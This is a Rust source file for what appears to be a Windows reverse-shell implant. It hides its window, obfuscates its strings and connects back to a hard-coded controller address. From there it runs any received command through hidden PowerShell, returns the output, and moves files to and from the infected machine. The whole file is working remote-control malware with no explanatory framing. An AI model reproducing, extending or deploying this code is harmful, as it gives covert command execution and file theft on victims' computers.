#![windows_subsystem = "windows"]

use tokio::{net::TcpStream, process};
use xorcrypt::{e, prepare_encryption};

use crate::models::{download_file, read, substr_exists, upload_file, write};
mod models;
prepare_encryption!();

#[tokio::main]
async fn main() {
    let addr = e!("127.0.0.1:8080");
    let mut conn = TcpStream::connect(addr).await.unwrap();
    loop {
        match read(&mut conn).await {
            Some(cmd) => {
                if substr_exists(&cmd, e!("::STARTFILE::").as_bytes()).await {
                    download_file(&cmd).await;
                    if write(&mut conn, b"[+] File uploaded successfully".to_vec())
                        .await
                        .is_err()
                    {
                        break;
                    }
                    continue;
                }
                let command = String::from_utf8(cmd.clone()).unwrap();
                println!("Command: {}", command);
                if substr_exists(&command.as_bytes().to_vec(), b"::DOWNLOAD::").await {
                    let command = command
                        .split(" ")
                        .map(|x| x.to_string())
                        .collect::<Vec<String>>();
                    let (_, args) = (&command[0], &command[1..]);
                    match args.get(0) {
                        Some(filename) => {
                            println!("Filename: {}", filename);
                            match tokio::fs::read(filename.trim()).await {
                                Ok(data) => {
                                    upload_file(&mut conn, filename, data).await.unwrap();
                                }
                                Err(_) => {
                                    write(&mut conn, b"[-] File not found".to_vec())
                                        .await
                                        .unwrap();
                                }
                            }
                        }
                        None => {
                            //
                        }
                    }
                    continue;
                }
                match command.as_str() {
                    "exit" => {
                        write(&mut conn, b"::EOF::".to_vec()).await.unwrap();
                        break;
                    }
                    _ => {
                        let output = run_command(command).await;
                        if write(&mut conn, output).await.is_err() {
                            break;
                        }
                    }
                }
            }
            None => {
                continue;
            }
        }
    }
}

async fn run_command(command: String) -> Vec<u8> {
    let mut output = process::Command::new(e!("powershell.exe"));
    output.creation_flags(0x8000000);
    let mut output = output
        .arg(e!("-NoProfile"))
        .arg(e!("-Command"))
        .arg(command.trim())
        .output()
        .await
        .unwrap();
    output.stdout.append(&mut output.stderr);
    output.stdout
}
